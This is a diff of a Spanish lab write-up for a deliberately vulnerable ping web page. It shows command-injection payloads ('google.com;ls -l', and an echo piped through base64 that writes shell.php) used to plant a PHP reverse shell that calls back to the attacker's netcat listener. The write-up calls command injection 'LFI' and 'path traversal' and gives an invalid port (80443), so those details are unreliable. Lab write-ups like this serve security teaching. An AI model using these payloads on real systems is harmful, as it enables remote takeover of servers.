@@ -1,11 +1,11 @@
 # Solución del laboratorio
 
-## Web LFI
+## Reconocimiento de la página web
 Tras deplegar el laboratorio, obtenemos al dirección de una página web donde se puede hacer ping a distintas direcciones.
 
 ![https://raw.githubusercontent.com/Alfesito/TFG-kubevuln/main/images/ping%20web.png](https://raw.githubusercontent.com/Alfesito/TFG-kubevuln/main/images/ping%20web.png)
 
-Como se está ejecutando el comando ping, comprobamos si se puede saltar los filtros para poder obtener un LFI, por ejemplo:
+Como se está ejecutando el comando ping, comprobamos si se puede saltar los filtros para poder leer información del sistema(Path Traversal), por ejemplo:
 ```bash 
 google.com;ls -l
 ``` 
@@ -13,7 +13,7 @@ google.com;ls -l
 
 ## LFI a RCE
 
-Como se puede observar en la imagen anterior, la página es vulnerable a LFI. Por ello intentaremos transformar el LFI a RCE a través de una reverse shell con PHP, modificando la IP y el puerto donde vamos a escuchar con netcat con nuestra máquina. Nuestro objetivo es conseguir escribir un archivo dentro del sistema al cual accediendo se lanza una shell en nuestra máquina que está escuchando. Más información del proceso en [php-reverse-shell](https://pentestmonkey.net/tools/web-shells/php-reverse-shell). Pasos: 
+Como se puede observar en la imagen anterior, la página puede ser vulnerable a LFI. Por ello intentaremos transformar el LFI a RCE a través de una reverse shell con PHP, modificando la IP y el puerto donde vamos a escuchar con netcat con nuestra máquina. Nuestro objetivo es conseguir escribir un archivo dentro del sistema al cual accediendo se lanza una shell en nuestra máquina que está escuchando. Más información del proceso en [php-reverse-shell](https://pentestmonkey.net/tools/web-shells/php-reverse-shell). Pasos: 
 
 1. Cambiamos la IP y el puerto y basemos el archivo php-revshell.php a base64. 
 ```bash 
@@ -22,7 +22,7 @@ base64 php-revshell.php
 
 2. Ejecutamos este comando el la web (utilizando como IP la 192.168.1.131 y el puerto 80443):
 ```bash 
-google.com;echo "<php-revshell in base64>" | base64 -d > shell.php
+google.com;echo "<php-revshell.php in base64>" | base64 -d > shell.php
 ``` 
 
 3. Verificamos que se ha subido el archivo shell.php: 
